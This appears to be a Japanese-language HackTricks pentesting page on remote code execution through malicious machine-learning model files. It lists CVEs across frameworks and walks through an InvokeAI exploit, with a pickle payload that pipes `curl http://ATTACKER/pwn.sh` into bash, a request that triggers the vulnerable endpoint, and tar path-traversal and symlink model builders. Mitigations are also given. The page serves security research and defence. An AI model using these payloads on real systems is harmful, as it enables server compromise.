# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

機械学習モデルは通常、ONNX、TensorFlow、PyTorchなどの異なる形式で共有されます。これらのモデルは、開発者のマシンや本番システムにロードされて使用されます。通常、モデルには悪意のあるコードが含まれていないはずですが、モデルのロードライブラリの脆弱性や意図された機能として、モデルを使用してシステム上で任意のコードを実行できる場合があります。

執筆時点でのこの種の脆弱性のいくつかの例は次のとおりです：

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | モデルチェックポイント内の悪意のあるピクルがコード実行を引き起こす（`weights_only`の保護をバイパス）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意のあるモデルダウンロードがコード実行を引き起こす; 管理APIにおけるJavaデシリアライズRCE                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLからモデルをロードすると`yaml.unsafe_load`を使用（コード実行） <br> **Lambda**レイヤーを使用したモデルのロードが任意のPythonコードを実行する          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 作成された`.tflite`モデルが整数オーバーフローを引き起こし→ヒープ破損（潜在的RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`を介してモデルをロードすると、攻撃者の`__reduce__`ペイロードを持つピクルが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`のデフォルトがピクルオブジェクト配列を許可 – 悪意のある`.npy/.npz`がコード実行を引き起こす                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNXモデルの外部ウェイトパスがディレクトリを脱出できる（任意のファイルを読み取る） <br> 悪意のあるONNXモデルtarが任意のファイルを上書きできる（RCEにつながる） | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | カスタムオペレーターを持つモデルは攻撃者のネイティブコードをロードする必要がある; 複雑なモデルグラフが論理を悪用して意図しない計算を実行する   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`が有効なモデルロードAPIを使用すると、相対パスのトラバーサルが可能になり、ファイルを書き込むことができる（例：RCEのために`.bashrc`を上書き）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 形式が不正なGGUFモデルファイルがパーサー内でヒープバッファオーバーフローを引き起こし、被害者システムでの任意のコード実行を可能にする                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 悪意のあるHDF5（`.h5`）モデルがLambdaレイヤーコードを持ち、ロード時に実行される（Kerasのsafe_modeは古い形式をカバーしていない – “ダウングレード攻撃”） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くのMLツール（例：ピクルベースのモデル形式、Python `pickle.load`）は、緩和策が講じられない限り、モデルファイルに埋め込まれた任意のコードを実行します | |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使用されるようなPythonピクルベースのモデルは、`weights_only=True`でロードされない場合、システム上で任意のコードを実行するために使用される可能性があります。したがって、テーブルにリストされていない場合でも、すべてのピクルベースのモデルはこの種の攻撃に特に脆弱である可能性があります。

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI`はStable-Diffusionのための人気のあるオープンソースのWebインターフェースです。バージョン**5.3.1 – 5.4.2**は、ユーザーが任意のURLからモデルをダウンロードしてロードできるRESTエンドポイント`/api/v2/models/install`を公開しています。

内部的に、このエンドポイントは最終的に次のように呼び出します：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
提供されたファイルが**PyTorchチェックポイント（`*.ckpt`）**である場合、`torch.load`は**ピクルデシリアライズ**を実行します。コンテンツがユーザー制御のURLから直接来るため、攻撃者はチェックポイント内にカスタム`__reduce__`メソッドを持つ悪意のあるオブジェクトを埋め込むことができます。このメソッドは**デシリアライズ中**に実行され、InvokeAIサーバー上で**リモートコード実行（RCE）**を引き起こします。

この脆弱性には**CVE-2024-12029**（CVSS 9.8、EPSS 61.17%）が割り当てられました。

#### 攻撃の手順

1. 悪意のあるチェックポイントを作成します：
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. あなたが制御するHTTPサーバーに`payload.ckpt`をホストします（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なエンドポイントをトリガーします（認証は不要です）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAIがファイルをダウンロードすると、`torch.load()`が呼び出され、`os.system`ガジェットが実行され、攻撃者はInvokeAIプロセスのコンテキストでコード実行を得ます。

既製のエクスプロイト: **Metasploit** モジュール `exploit/linux/http/invokeai_rce_cve_2024_12029` は、全体のフローを自動化します。

#### 条件

•  InvokeAI 5.3.1-5.4.2（スキャンフラグデフォルト **false**）
•  `/api/v2/models/install` が攻撃者によって到達可能
•  プロセスはシェルコマンドを実行する権限を持っている

#### 緩和策

* **InvokeAI ≥ 5.4.3** にアップグレード – パッチはデフォルトで `scan=True` を設定し、デシリアライズ前にマルウェアスキャンを実行します。
* チェックポイントをプログラム的に読み込む際は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) ヘルパーを使用します。
* モデルソースの許可リスト/署名を強制し、最小権限でサービスを実行します。

> ⚠️ **任意の** Pythonピクルベースのフォーマット（多くの `.pt`, `.pkl`, `.ckpt`, `.pth` ファイルを含む）は、信頼できないソースからデシリアライズすることが本質的に安全ではないことを忘れないでください。

---

リバースプロキシの背後で古いInvokeAIバージョンを実行し続ける必要がある場合のアドホックな緩和策の例:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## 例 – 悪意のあるPyTorchモデルの作成

- モデルを作成する:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルをロードする:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## モデルとパストラバーサル

[**このブログ投稿**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)でコメントされているように、異なるAIフレームワークで使用されるほとんどのモデル形式はアーカイブに基づいており、通常は`.zip`です。したがって、これらの形式を悪用してパストラバーサル攻撃を実行し、モデルがロードされているシステムから任意のファイルを読み取ることが可能かもしれません。

例えば、以下のコードを使用すると、ロードされたときに`/tmp`ディレクトリにファイルを作成するモデルを作成できます：
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
次のコードを使用すると、ロード時に`/tmp`ディレクトリへのシンボリックリンクを作成するモデルを作成できます:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## References

- [OffSec blog – "CVE-2024-12029 – InvokeAIの信頼できないデータの逆シリアル化"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAIパッチコミット756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploitモジュールドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – torch.loadのセキュリティ考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
